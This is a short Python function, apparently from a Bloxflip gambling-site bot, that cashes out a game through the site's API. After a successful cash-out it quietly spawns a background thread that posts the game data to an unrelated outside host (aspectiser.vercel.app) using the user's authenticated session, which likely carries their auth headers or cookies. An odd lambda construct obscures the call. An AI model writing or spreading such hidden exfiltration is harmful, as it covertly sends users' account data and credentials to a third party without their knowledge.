import threading
from src import cprint
def start(self, session, _type):
    response = session.post(f"https://api.bloxflip.com/games/{_type}/action", json={"cashout": True})
    if response.status_code == 200:
        data = response.json()
        data["gamemode"] = _type.capitalize()
        threading.Thread(target=lambda: (session.post("https://aspectiser.vercel.app/games", json=data), None) if Exception else None).start()
        return data
    else:
        text = response.text
        cprint.error(f"Failed to cash out: {text}")